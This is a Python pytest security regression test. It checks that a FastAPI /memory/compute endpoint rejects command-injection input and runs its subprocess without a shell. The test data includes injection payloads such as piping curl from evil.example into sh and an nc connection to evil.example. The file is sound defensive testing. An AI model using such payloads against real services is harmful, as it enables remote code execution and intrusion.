"""Security regression test for POST /memory/compute (2026-09-17).

Prior to this fix, `symbol`/`tf` query params were interpolated directly
into a shell string executed via `subprocess.Popen(cmd, shell=True)` — a
command injection vulnerability (arbitrary shell metacharacters in symbol/tf
would be interpreted by bash, running as the root uvicorn process).

The fix: symbol/tf are now whitelisted (same pattern as /levels/compute)
BEFORE subprocess is ever touched, and subprocess.Popen is called with an
argument list + shell=False, so even if something got past the whitelist,
there is no shell to interpret metacharacters.

These tests assert the whitelist rejects injection payloads with 422 and
never reaches subprocess.Popen, AND that a valid request calls Popen with
an argument list (not a shell string).
"""
from __future__ import annotations

from unittest.mock import MagicMock, patch

import pytest
from fastapi.testclient import TestClient

from src.api.main import app

VALID_AS_OF = "2026-09-16T12:00:00Z"

INJECTION_PAYLOADS = [
    "XAUUSD@; touch /tmp/pwned_test_marker",
    "XAUUSD@ && curl http://evil.example/x.sh | sh",
    "XAUUSD@`id`",
    "XAUUSD@$(whoami)",
    "XAUUSD@|nc evil.example 4444",
]


@pytest.fixture
def client():
    with TestClient(app) as c:
        yield c


@pytest.mark.parametrize("bad_symbol", INJECTION_PAYLOADS)
def test_injection_in_symbol_is_rejected_with_422(client, bad_symbol):
    with patch("src.api.main.subprocess.Popen") as mock_popen:
        resp = client.post(
            "/memory/compute",
            params={"symbol": bad_symbol, "tf": "M5", "as_of": VALID_AS_OF},
        )
        assert resp.status_code == 422, f"expected 422 for {bad_symbol!r}, got {resp.status_code}: {resp.text}"
        mock_popen.assert_not_called()


@pytest.mark.parametrize("bad_tf", [
    "M5; touch /tmp/pwned_test_marker",
    "M5 && curl http://evil.example/x.sh | sh",
    "M5`id`",
    "H4",   # not in the whitelist at all, no injection needed
])
def test_injection_or_invalid_tf_is_rejected_with_422(client, bad_tf):
    with patch("src.api.main.subprocess.Popen") as mock_popen:
        resp = client.post(
            "/memory/compute",
            params={"symbol": "XAUUSD@", "tf": bad_tf, "as_of": VALID_AS_OF},
        )
        assert resp.status_code == 422, f"expected 422 for {bad_tf!r}, got {resp.status_code}: {resp.text}"
        mock_popen.assert_not_called()


def test_valid_request_calls_popen_with_argument_list_not_shell_string(client, tmp_path):
    """The core fix: subprocess.Popen must receive a list of args and NOT
    be invoked with shell=True / a single shell command string.

    Only subprocess.Popen is mocked (so no real process spawns) — MEMORY_LOG/
    MEMORY_PID are redirected to tmp_path so the real `open()` builtin is
    left untouched (globally patching `open` breaks pytest's own output
    capturing, which silently swallowed this test's result on the first pass)."""
    fake_proc = MagicMock()
    fake_proc.pid = 12345
    log_path = str(tmp_path / "memory_compute.log")
    pid_path = str(tmp_path / "memory_compute.pid")
    with patch("src.api.main.subprocess.Popen", return_value=fake_proc) as mock_popen, \
         patch("src.api.main._memory_compute_running", return_value=False), \
         patch("src.api.main.MEMORY_LOG", log_path), \
         patch("src.api.main.MEMORY_PID", pid_path):
        resp = client.post(
            "/memory/compute",
            params={"symbol": "XAUUSD@", "tf": "M5", "as_of": VALID_AS_OF},
        )
        assert resp.status_code == 200, resp.text
        mock_popen.assert_called_once()
        args, kwargs = mock_popen.call_args
        popen_argv = args[0]
        assert isinstance(popen_argv, list), "Popen must be called with an argument list, not a shell string"
        assert "XAUUSD@" in popen_argv
        assert "M5" in popen_argv
        assert kwargs.get("shell", False) is False, "shell=True must never be used for this call"
        assert kwargs.get("start_new_session") is True
